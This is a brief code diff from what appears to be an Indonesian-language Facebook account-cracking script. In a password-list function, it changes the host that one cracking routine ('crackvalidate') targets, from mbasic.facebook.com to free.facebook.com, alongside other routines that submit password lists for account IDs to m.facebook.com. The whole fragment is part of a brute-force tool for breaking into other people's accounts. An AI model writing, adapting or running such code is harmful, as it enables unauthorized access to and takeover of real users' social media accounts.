@@ -412,7 +412,7 @@ def passwordlist():
 						pwx.append(sandi_kita)
 				else:pass
 				if 'validate' in method:
-				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'mbasic.facebook.com')
+				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'free.facebook.com')
 				elif 'reguler' in method:
 				    pemuda_tersakiti.submit(crackreguler,idf,pwx,'m.facebook.com')
 				elif 'asyinc' in method:
